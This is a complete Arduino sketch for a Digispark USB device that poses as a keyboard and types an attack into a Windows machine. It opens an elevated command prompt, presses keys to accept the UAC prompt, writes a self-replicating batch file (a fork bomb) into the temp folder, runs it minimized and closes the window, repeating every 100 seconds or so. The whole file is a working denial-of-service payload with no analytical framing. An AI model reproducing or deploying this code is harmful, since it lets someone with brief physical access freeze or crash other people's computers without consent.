#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cd %temp%");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("copy con fu.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("@echo off");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(":START");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cmd /C ""\"start /MIN fu.bat\"""");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("GOTO START");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cmd /C ""\"start /MIN fu.bat\"""");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
